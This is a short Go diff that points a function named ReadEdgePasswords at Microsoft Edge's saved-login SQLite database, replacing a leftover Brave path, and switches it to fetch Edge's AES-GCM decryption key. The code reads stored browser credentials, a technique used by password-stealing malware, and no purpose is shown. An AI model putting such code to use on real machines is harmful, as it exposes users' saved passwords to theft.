@@ -69,7 +69,7 @@ func ReadEdgePasswords() ([]Password, error) {
 	if err != nil {
 		return nil, err
 	}
-	passwordsPath := filepath.Join("C:\\Users", osUser, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data")
+	passwordsPath := filepath.Join("C:\\Users", osUser, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
 
 	dbConn, err := sql.Open("sqlite3", fmt.Sprintf("file:%s?cache=shared&mode=ro", passwordsPath))
 	if err != nil {
@@ -77,7 +77,7 @@ func ReadEdgePasswords() ([]Password, error) {
 	}
 	defer dbConn.Close()
 
-	err = getAesGCMKeyBrave()
+	err = getAesGCMKeyEdge()
 	if err != nil {
 		return nil, err
 	}
